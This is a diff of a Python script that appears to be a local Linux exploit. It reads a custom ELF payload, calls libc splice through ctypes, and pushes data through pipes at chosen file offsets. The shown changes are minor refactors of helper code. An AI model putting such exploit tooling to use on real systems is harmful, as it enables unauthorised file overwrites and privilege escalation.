@@ -12,10 +12,10 @@ if len(sys.argv) == 2: # custom payload is specified
         payload = elf.read()
         print(f"Read in custom payload with size = {len(payload)} bytes")
         
-# pre-3.10 way of calling os.splice(...)
+# pre-3.10 way of calling os.splice(...) by dynamically resolving it
 libc = ctypes.CDLL("libc.so.6", use_errno=True)
 libc.splice.restype = ctypes.c_ssize_t
-libc.splice.argtypes = [ctypes.c_int, ctypes.POINTER(ctypes.c_int64), ctypes.c_int, ctypes.POINTER(ctypes.c_int64), ctypes.c_size_t, ctypes.c_uint]
+libc.splice.argtypes = [ctypes.c_int, ctypes.POINTER(ctypes.c_longlong), ctypes.c_int, ctypes.POINTER(ctypes.c_longlong), ctypes.c_size_t, ctypes.c_uint]
 
 
 def splice(fd_in, fd_out, sz, offset_src=None, offset_dst=None):
@@ -31,8 +31,7 @@ def splice(fd_in, fd_out, sz, offset_src=None, offset_dst=None):
     else:
         p_off_out = None
 
-    ret = libc.splice(fd_in, p_off_in, fd_out, p_off_out, sz, 0)
-    if ret == -1:
+    if libc.splice(fd_in, p_off_in, fd_out, p_off_out, sz, 0) == -1:
         errno = ctypes.get_errno()
         raise OSError(errno, os.strerror(errno))
 
@@ -60,6 +59,7 @@ def send(fd, offset, chunk):
 
     os.close(rd)
     os.close(wr)
+    print("Pipe closed")
 
     try:
         '''
